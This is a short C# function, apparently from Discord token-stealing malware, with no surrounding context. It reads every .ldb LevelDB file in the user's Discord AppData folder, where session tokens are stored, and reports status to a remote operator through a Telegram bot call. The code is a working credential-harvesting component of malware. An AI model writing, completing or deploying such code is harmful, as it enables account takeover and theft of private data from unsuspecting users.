```csharp
private static List<string> SearchForFile()
{
    List<string> ldbFiles = new List<string>();

    // Path to the Discord appdata directory
    string discordPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord");

    // Check if the Discord directory exists
    if (Directory.Exists(discordPath))
    {
        // Get all the files with the.ldb extension in the Discord directory
        string[] ldbFilesArray = Directory.GetFiles(discordPath, "*.ldb", SearchOption.AllDirectories);

        // Add the file contents to the list
        foreach (string file in ldbFilesArray)
        {
            try
            {
                // Read the file contents
                string fileContent = File.ReadAllText(file);
                // Add the file content to the list
                ldbFiles.Add(fileContent);
            }
            catch (IOException e)
            {
                // Handle any IO exceptions (e.g., file access issues)
                Console.WriteLine($"Error reading file: {e.Message}");
            }
        }
    }
    else
    {
        // If the Discord directory does not exist, notify through Telegram
        telegram.sendText("⛔ Discord directory not found");
    }

    return ldbFiles;
}
